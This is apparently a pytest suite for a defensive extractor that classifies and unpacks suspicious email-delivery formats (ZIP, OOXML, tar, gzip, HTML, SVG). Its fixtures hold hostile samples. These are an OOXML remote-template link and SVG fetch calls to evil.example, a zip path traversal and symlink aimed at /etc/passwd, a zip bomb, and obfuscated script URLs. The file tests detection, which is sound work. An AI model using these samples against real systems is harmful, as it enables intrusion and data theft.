"""Tests for delivery-format intake (D19).

Fixtures are built with the standard library's own archives/writers, so the
extractor is exercised against real container bytes rather than hand-written
strings. ``test_real_ooxml_capture`` additionally runs against a real Office
document found on the host when one is present.
"""

from __future__ import annotations

import gzip
import io
import tarfile
import zipfile
from pathlib import Path

import pytest

from engine.intake.delivery import (
    DeliveryFormat,
    classify_delivery,
    decode_js_escapes,
    extract_delivery,
)

OOXML_CONTENT_TYPES = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>
</Types>
"""

OOXML_EXTERNAL_RELS = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="https://evil.example/template.dotm" TargetMode="External"/>
</Relationships>
"""


def _write_zip(path: Path, members: dict[str, bytes], *, symlinks: tuple[str, ...] = ()) -> Path:
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, data in members.items():
            if name in symlinks:
                info = zipfile.ZipInfo(name)
                info.external_attr = (0o120777 << 16)
                archive.writestr(info, data)
            else:
                archive.writestr(name, data)
    return path


def _write_ooxml(path: Path, *, macro: bool = True, embedded: bool = True) -> Path:
    members: dict[str, bytes] = {
        "[Content_Types].xml": OOXML_CONTENT_TYPES,
        "_rels/.rels": b"<Relationships/>",
        "word/document.xml": b"<w:document>hello</w:document>",
        "word/_rels/document.xml.rels": OOXML_EXTERNAL_RELS,
    }
    if macro:
        members["word/vbaProject.bin"] = b"\xd0\xcf\x11\xe0" + b"MACRO" * 64
    if embedded:
        members["word/embeddings/oleObject1.bin"] = b"\xd0\xcf\x11\xe0" + b"OBJ" * 32
    return _write_zip(path, members)


# ---------------------------------------------------------------------------
# Classification
# ---------------------------------------------------------------------------


def test_classify_plain_zip(tmp_path: Path):
    path = _write_zip(tmp_path / "a.zip", {"readme.txt": b"hello"})
    result = classify_delivery(path)
    assert result.format is DeliveryFormat.ZIP
    assert result.is_container is True


def test_classify_ooxml_document(tmp_path: Path):
    path = _write_ooxml(tmp_path / "macro.docm")
    result = classify_delivery(path)
    assert result.format is DeliveryFormat.OOXML
    assert "docm" in result.detail


def test_classify_pdf(tmp_path: Path):
    path = tmp_path / "doc.pdf"
    path.write_bytes(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n")
    assert classify_delivery(path).format is DeliveryFormat.PDF


def test_classify_lnk_uses_the_shell_link_clsid(tmp_path: Path):
    path = tmp_path / "invoice.lnk"
    path.write_bytes(bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\x00" * 32)
    assert classify_delivery(path).format is DeliveryFormat.LNK


def test_classify_ole_compound_file(tmp_path: Path):
    path = tmp_path / "legacy.doc"
    path.write_bytes(bytes.fromhex("d0cf11e0a1b11ae1") + b"\x00" * 64)
    assert classify_delivery(path).format is DeliveryFormat.OLE


def test_classify_seven_zip(tmp_path: Path):
    path = tmp_path / "a.7z"
    path.write_bytes(bytes.fromhex("377abcaf271c") + b"\x00" * 32)
    assert classify_delivery(path).format is DeliveryFormat.SEVEN_ZIP


def test_classify_gzip(tmp_path: Path):
    path = tmp_path / "a.gz"
    path.write_bytes(gzip.compress(b"hello"))
    assert classify_delivery(path).format is DeliveryFormat.GZIP


def test_classify_html_and_svg(tmp_path: Path):
    html = tmp_path / "page.html"
    html.write_text("<!doctype html><html><body>hi</body></html>")
    assert classify_delivery(html).format is DeliveryFormat.HTML

    svg = tmp_path / "image.svg"
    svg.write_text('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')
    assert classify_delivery(svg).format is DeliveryFormat.SVG


def test_classify_tar(tmp_path: Path):
    path = tmp_path / "a.tar"
    with tarfile.open(path, "w") as archive:
        info = tarfile.TarInfo("readme.txt")
        payload = b"hello"
        info.size = len(payload)
        archive.addfile(info, io.BytesIO(payload))
    assert classify_delivery(path).format is DeliveryFormat.TAR


def test_classify_unknown(tmp_path: Path):
    path = tmp_path / "blob.bin"
    path.write_bytes(b"\x00\x01\x02\x03")
    assert classify_delivery(path).format is DeliveryFormat.UNKNOWN


# ---------------------------------------------------------------------------
# ZIP / OOXML extraction
# ---------------------------------------------------------------------------


def test_zip_extracts_members(tmp_path: Path):
    path = _write_zip(tmp_path / "bundle.zip", {"a.txt": b"alpha", "b.bin": b"beta"})
    result = extract_delivery(path, tmp_path / "out")
    names = sorted(child.name for child in result.children)
    assert names == ["a.txt", "b.bin"]
    assert all(child.sha256 for child in result.children)
    assert all(child.path.exists() for child in result.children)


def test_zip_member_path_traversal_is_confined(tmp_path: Path):
    path = _write_zip(
        tmp_path / "evil.zip",
        {"../../../../etc/passwd": b"root:x:0:0", "ok.txt": b"fine"},
    )
    out = tmp_path / "out"
    result = extract_delivery(path, out)
    # The member is flattened under the extraction root; nothing escapes.
    for child in result.children:
        assert out.resolve() in child.path.resolve().parents
    assert any(child.name.endswith("etc/passwd") for child in result.children)


def test_zip_symlink_member_is_refused(tmp_path: Path):
    path = _write_zip(
        tmp_path / "links.zip",
        {"target": b"/etc/passwd"},
        symlinks=("target",),
    )
    result = extract_delivery(path, tmp_path / "out")
    assert result.children == []
    assert any(item["format"] == "symlink" for item in result.unsupported)


def test_ooxml_macro_and_embedded_object_flags(tmp_path: Path):
    path = _write_ooxml(tmp_path / "invoice.docm")
    result = extract_delivery(path, tmp_path / "out")
    assert result.format is DeliveryFormat.OOXML
    assert "ooxml-macro" in result.flags
    assert "ooxml-embedded-object" in result.flags
    assert "ooxml-external-relationship" in result.flags
    assert "ooxml-macro-enabled" in result.flags
    macro_children = [c for c in result.children if c.name.lower().endswith("vbaproject.bin")]
    assert macro_children and "ooxml-macro" in macro_children[0].flags


def test_zip_bomb_ratio_is_refused(tmp_path: Path):
    bomb = tmp_path / "bomb.zip"
    with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("zeros.bin", b"\x00" * (5 * 1024 * 1024))
    result = extract_delivery(bomb, tmp_path / "out")
    assert result.children == []
    assert any(item["format"] == "compression-ratio" for item in result.unsupported)
    assert "zip-suspicious-ratio" in result.flags


def test_corrupt_zip_records_an_error_not_an_exception(tmp_path: Path):
    path = tmp_path / "broken.zip"
    path.write_bytes(b"PK\x03\x04" + b"\x00" * 64)  # a magic, not an archive
    result = extract_delivery(path, tmp_path / "out")
    assert result.errors, "a corrupt container must be loud, not silently empty"


# ---------------------------------------------------------------------------
# tar / gzip / nested recursion
# ---------------------------------------------------------------------------


def test_tar_extracts_members(tmp_path: Path):
    path = tmp_path / "a.tar"
    with tarfile.open(path, "w") as archive:
        for name, payload in (("one.txt", b"1"), ("two.txt", b"2")):
            info = tarfile.TarInfo(name)
            info.size = len(payload)
            archive.addfile(info, io.BytesIO(payload))
    result = extract_delivery(path, tmp_path / "out")
    assert sorted(c.name for c in result.children) == ["one.txt", "two.txt"]


def test_gzip_decompresses_then_recurses_into_tar(tmp_path: Path):
    tar_bytes = io.BytesIO()
    with tarfile.open(fileobj=tar_bytes, mode="w") as archive:
        info = tarfile.TarInfo("payload.sh")
        payload = b"#!/bin/sh\necho pwned\n"
        info.size = len(payload)
        archive.addfile(info, io.BytesIO(payload))
    path = tmp_path / "a.tar.gz"
    path.write_bytes(gzip.compress(tar_bytes.getvalue()))

    result = extract_delivery(path, tmp_path / "out")
    assert "gzip-stream" in result.flags
    assert any(c.name == "payload.sh" for c in result.children)
    assert any(c.depth == 2 for c in result.children)


def test_nested_zip_recursion_and_depth(tmp_path: Path):
    inner = _write_zip(tmp_path / "inner.zip", {"deep.txt": b"deep"})
    outer = _write_zip(tmp_path / "outer.zip", {"inner.zip": inner.read_bytes()})
    result = extract_delivery(outer, tmp_path / "out")
    deep = [c for c in result.children if c.name == "deep.txt"]
    assert deep and deep[0].depth == 2


def test_depth_limit_stops_recursion(tmp_path: Path):
    inner = _write_zip(tmp_path / "inner.zip", {"deep.txt": b"deep"})
    outer = _write_zip(tmp_path / "outer.zip", {"inner.zip": inner.read_bytes()})
    result = extract_delivery(outer, tmp_path / "out", max_depth=1)
    assert not any(c.name == "deep.txt" for c in result.children)


def test_child_limit_is_reported_as_truncated(tmp_path: Path):
    members = {f"file-{i}.txt": b"x" for i in range(10)}
    path = _write_zip(tmp_path / "many.zip", members)
    result = extract_delivery(path, tmp_path / "out", max_children=3)
    assert len(result.children) == 3
    assert result.truncated is True
    assert "child-limit-reached" in result.flags


# ---------------------------------------------------------------------------
# HTML / SVG
# ---------------------------------------------------------------------------


def test_html_script_blocks_are_extracted_and_deobfuscated(tmp_path: Path):
    html = tmp_path / "mail.html"
    html.write_text(
        "<html><body>"
        '<script>var u="\\x68\\x74\\x74\\x70://evil.example/p";</script>'
        '<script src="https://evil.example/x.js"></script>'
        '<meta http-equiv="refresh" content="0;url=https://evil.example/go">'
        "</body></html>"
    )
    result = extract_delivery(html, tmp_path / "out")
    scripts = [c for c in result.children if c.extractor == "html-script"]
    assert scripts, "a <script> block must become an extracted child"
    body = scripts[0].path.read_bytes()
    assert b"http://evil.example/p" in body
    assert "decoded-escapes" in scripts[0].flags
    assert "html-remote-reference" in result.flags
    assert "html-script" in result.flags


def test_svg_script_and_handlers_are_flagged(tmp_path: Path):
    svg = tmp_path / "invoice.svg"
    svg.write_text(
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
        "<script>fetch('http://evil.example/c2')</script></svg>"
    )
    result = extract_delivery(svg, tmp_path / "out")
    assert result.format is DeliveryFormat.SVG
    assert "svg-script" in result.flags
    assert "svg-inline-handler" in result.flags
    assert any(b"evil.example" in c.path.read_bytes() for c in result.children)


def test_decode_js_escapes_is_best_effort_only():
    assert decode_js_escapes(rb"\x41\x42") == b"AB"
    assert decode_js_escapes(rb"\u0041") == b"A"
    # Runtime concatenation is not resolved — and must not pretend to be.
    assert decode_js_escapes(b'a'+b't'+b'ob') == b'atob'


# ---------------------------------------------------------------------------
# Unsupported formats are loud, never silent
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload,fmt",
    [
        (b"%PDF-1.7\n1 0 obj\n", "pdf"),
        (bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\x00" * 16, "lnk"),
        (bytes.fromhex("d0cf11e0a1b11ae1") + b"\x00" * 64, "ole"),
        (bytes.fromhex("377abcaf271c") + b"\x00" * 32, "7z"),
        (b"Rar!\x1a\x07\x00" + b"\x00" * 32, "rar"),
        (b"{\\rtf1\\ansi hello}", "rtf"),
    ],
)
def test_unsupported_delivery_formats_are_reported(tmp_path: Path, payload: bytes, fmt: str):
    path = tmp_path / f"sample.{fmt}"
    path.write_bytes(payload)
    result = extract_delivery(path, tmp_path / "out")
    assert result.children == []
    assert any(item["format"] == fmt for item in result.unsupported)
    assert all(item["reason"] for item in result.unsupported), "every refusal needs a reason"


def test_iso_image_is_detected_but_loud(tmp_path: Path):
    path = tmp_path / "image.iso"
    payload = bytearray(0x8010)
    payload[0x8001:0x8006] = b"CD001"
    path.write_bytes(bytes(payload))
    result = extract_delivery(path, tmp_path / "out")
    assert result.format is DeliveryFormat.ISO
    assert any(item["format"] == "iso" for item in result.unsupported)


def test_unsupported_format_nested_in_a_zip_is_still_reported(tmp_path: Path):
    path = _write_zip(tmp_path / "bundle.zip", {"doc.pdf": b"%PDF-1.7\n1 0 obj\n"})
    result = extract_delivery(path, tmp_path / "out")
    assert any(c.name == "doc.pdf" for c in result.children)
    assert any(item["format"] == "pdf" for item in result.unsupported)


# ---------------------------------------------------------------------------
# Result shape
# ---------------------------------------------------------------------------


def test_result_to_dict_is_json_ready(tmp_path: Path):
    import json

    path = _write_ooxml(tmp_path / "invoice.docm")
    result = extract_delivery(path, tmp_path / "out")
    payload = json.loads(json.dumps(result.to_dict()))
    assert payload["format"] == "ooxml"
    assert payload["is_container"] is True
    assert payload["children"]
    # No absolute host path may leak into the bundle.
    for child in payload["children"]:
        assert not child["rel_path"].startswith("/")
        assert str(tmp_path) not in child["rel_path"]


# ---------------------------------------------------------------------------
# A real capture, when one is available on this host
# ---------------------------------------------------------------------------


def test_real_ooxml_capture():
    """Run against a real Office document if the host has one to hand."""
    candidates = sorted(Path.home().glob("Downloads/*.docx"))
    if not candidates:
        pytest.skip("no real .docx on this host")
    result = extract_delivery(candidates[0], Path("/tmp/hatchery-real-ooxml"))
    assert result.format is DeliveryFormat.OOXML
    assert any(c.name == "word/document.xml" for c in result.children)


def test_extracted_children_get_a_coarse_type_not_unknown(tmp_path: Path):
    path = _write_zip(
        tmp_path / "mixed.zip",
        {
            "readme.txt": b"plain text",
            "run.sh": b"#!/bin/sh\necho hi\n",
            "stub.exe": b"MZ" + b"\x00" * 32,
            "blob.bin": bytes(range(256)),
        },
    )
    result = extract_delivery(path, tmp_path / "out")
    types = {child.name: child.format for child in result.children}
    assert types["readme.txt"] == "text"
    assert types["run.sh"] == "script"
    assert types["stub.exe"] == "pe"
    assert types["blob.bin"] == "bin"
